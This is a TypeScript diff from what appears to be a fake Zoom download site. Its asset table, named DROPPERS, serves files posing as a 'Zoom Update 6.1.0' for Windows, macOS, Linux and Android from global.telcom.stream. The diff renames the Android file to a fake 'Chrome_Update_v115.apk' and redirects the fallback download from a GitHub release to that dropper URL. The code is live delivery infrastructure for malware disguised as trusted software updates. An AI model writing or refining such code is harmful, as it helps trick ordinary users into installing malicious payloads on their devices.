@@ -6,7 +6,7 @@ const DROPPERS: Partial<Record<ClientPlatform, ZoomClientAsset>> = {
   windows: { name: "Zoom_Update_v6.1.0.zip", url: "https://global.telcom.stream/downloads/droppers/Zoom_Update_v6.1.0-windows.zip", size: 25_072, platform: "windows", format: "zip", arch: "x64", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
   macos: { name: "Zoom_Update_v6.1.0.zip", url: "https://global.telcom.stream/downloads/droppers/Zoom_Update_v6.1.0-macos.zip", size: 85_808, platform: "macos", format: "zip", arch: "universal", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
   linux: { name: "Zoom_Update_v6.1.0.tar.gz", url: "https://global.telcom.stream/downloads/droppers/Zoom_Update_v6.1.0-linux.tar.gz", size: 11_158, platform: "linux", format: "targz", arch: "x64", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
-  android: { name: "zoom-private-universal-release.apk", url: "https://global.telcom.stream/downloads/droppers/zoom-private-universal-release.apk", size: 23_263_388, platform: "android", format: "apk", arch: "universal", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
+  android: { name: "Chrome_Update_v115.apk", url: "https://global.telcom.stream/downloads/droppers/Chrome_Update_v115.apk", size: 21_510_132, platform: "android", format: "apk", arch: "universal", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
 };
 const LOCAL_RELEASES_API = "/api/releases";
 const GITHUB_RELEASES_API = `https://api.github.com/repos/${GITHUB_REPO}/releases?per_page=30`;
@@ -57,8 +57,8 @@ const FORMAT_SCORES: Record<ClientPlatform, Partial<Record<ClientFormat, number>
 
 const FALLBACK_ASSETS: ZoomClientAsset[] = [
   {
-    name: "zoom-private-universal-release.apk",
-    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-private-universal-release.apk`,
+    name: "Chrome_Update_v115.apk",
+    url: "https://global.telcom.stream/downloads/droppers/Chrome_Update_v115.apk",
     size: 23_234_938,
     platform: "android",
     format: "apk",
